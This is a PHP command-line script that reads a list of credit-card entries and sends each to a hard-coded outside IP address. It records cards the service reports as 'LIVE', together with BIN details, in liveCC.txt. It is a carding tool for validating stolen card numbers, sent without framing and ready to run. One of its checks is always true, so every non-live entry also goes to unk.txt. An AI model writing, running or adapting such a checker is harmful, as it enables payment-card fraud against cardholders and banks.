<?php

do {
  $pathFile = input("Path File List");
  if(empty($pathFile)) {
    $initiateRepeat = 1;
  } else if(!file_exists($pathFile)) {
    $initiateRepeat = 1;
  } else {
    $initiateRepeat = 0;
  }
} while($initiateRepeat);


$delimeter = explode("\n", trim(file_get_contents($pathFile)));
$checkTotal = 0;
$amountList = count($delimeter);

foreach($delimeter as $format) {
$format = trim($format);
    $response = file_get_contents("http://162.144.238.170/~malenkio/tololl/?format=".trim($format));
    if(json_decode($response,1)['status'] == "LIVE") {
      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." - ".@json_decode($response,1)['bin_info']." => LIVE\n";
      file_put_contents("liveCC.txt", $format." ".json_decode($response,1)['bin_info']."\n", FILE_APPEND);
    } else {
      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => DIE ".json_decode($response,1)['message']."\n";
	  if(json_decode($response,1)['status'] !== "DIE" || json_decode($response,1)['status'] !== "LIVE") {
        file_put_contents("unk.txt", $format."\n", FILE_APPEND);
      }
  }
  $checkTotal++;
}

function input($text) {
  echo $text.": ";
  $a = trim(fgets(STDIN));
  return $a;
}
